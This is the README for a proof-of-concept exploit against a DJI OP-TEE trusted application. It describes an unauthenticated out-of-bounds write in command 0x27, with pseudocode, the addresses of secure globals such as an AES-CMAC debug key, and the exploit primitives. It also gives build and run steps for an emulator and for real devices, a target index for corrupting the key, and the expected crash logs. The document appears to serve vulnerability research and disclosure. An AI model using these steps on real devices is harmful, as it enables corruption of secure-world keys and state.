# PoC — DJI OP-TEE TA `e91c9402` cmd 0x27 OOB write (BUG 1)

Normal-world Client Application that triggers the **unauthenticated out-of-bounds
write** in command `0x27` (`ssd_verify` → `ssd_save_info_to_memory`, TA+0x1ac) of
TA `e91c9402-64a0-470f-88e7-bf5d3c606b6a`. See `/srv/TA_e91c9402_ssd_bugs_writeup.md`.

## The bug

`case 0x27` gates only on `paramTypes == TEEC_MEMREF_TEMP_INPUT (5)` and
`param0.size == 0x6d`. It then reads a **16-bit slot index** out of the
CA-controlled buffer and indexes a fixed **32-entry** global array with **no
bounds check**:

```c
idx = *(uint16_t *)(param0.buffer + 1);              // 0..0xFFFF, attacker-set
if (ssd_info_ptr_array[idx] == 0)                    // (A) idx>=32 = OOB
    ssd_info_ptr_array[idx] = malloc(0x6e);
memcpy(ssd_info_ptr_array[idx], param0.buffer, 0x6d);// (B) 0x6d attacker bytes
*(u8 *)(slot + 0x6d) = status;
```

The corrupting path runs on the **RPMB-miss branch**, taken for any
unprovisioned `idx` — so it needs **no authentication, no secrets, no signing
keys**. `ssd_info_ptr_array` is at `0x129c30`; security-critical globals sit
just past it (AES-CMAC secure-debug key `0x129ee0`, `onetime_enable_flag`
`0x129ef8`, the 32 KB `ta_heap` at `0x129f30`).

Two primitives, both with a fully attacker-controlled 0x6d-byte payload:
- **(A)** slot is 0 (most OOB `.bss` slots): plants a known heap pointer into
  the secure global at `0x129c30 + idx*8`, and fills it with attacker bytes.
- **(B)** slot is non-zero: `memcpy` of 0x6e attacker bytes through whatever
  pointer value sits at that OOB offset → write-what-where.

## Build & run

Against the taemu emulator (what this tree is set up for):

```sh
# 1. start the TA in the emulator (interactive mode binds 127.0.0.1:1337)
cd /srv/emulator
python3 -m emulate --tee optee rootfs/e91c9402-64a0-470f-88e7bf5d3c606b6a.ta

# 2. build + run the CA (separate shell)
cd /srv/optee/pocs/e91_ssd_verify_oob
make emulator
./poc            # default slot index 0xFFFF
./poc 86         # target the AES-CMAC key global (idx 86), etc.
```

`make docker` builds and runs it inside the `emu` container.

On a real device, compile against the OP-TEE client library (`libteec`) without
`-DEMULATE` (`make device`, or the NDK `Android.mk`); `repro.h` then resolves
the standard `TEEC_*` symbols from `libteec.so`.

## Expected result

`./poc` (idx `0xFFFF`) — `ssd_info_ptr_array[0xFFFF]` is ~512 KB past the array,
outside any mapped secure region, so the missing bounds check manifests as a
secure-world data abort:

```
[+] session opened to e91c9402-64a0-470f-88e7-bf5d3c606b6a
[*] InvokeCommand cmd=0x27 paramTypes=0x5 size=0x6d slot_idx=65535 (0xffff)
    -> OOB: ssd_info_ptr_array[65535] targets secure global 0x1a9c28 (array bound is 32)
...
internal err: recv msg error          # emulator socket dropped: secure world crashed
```

Emulator side:

```
unicorn ...UcError: Invalid memory read (UC_ERR_READ_UNMAPPED)
PC = ...e91c9402...ta + 0x1e0          # inside ssd_save_info_to_memory @ TA+0x1ac
```

A smaller in-range-of-mapping index (e.g. `./poc 86`) instead exercises the
stealthy controlled-write primitive (A): it returns `0xfffffffa` ("ssd info not
available in RPMB") while silently corrupting the targeted secure global.

`./poc 0` is the benign in-bounds case (clean success path).
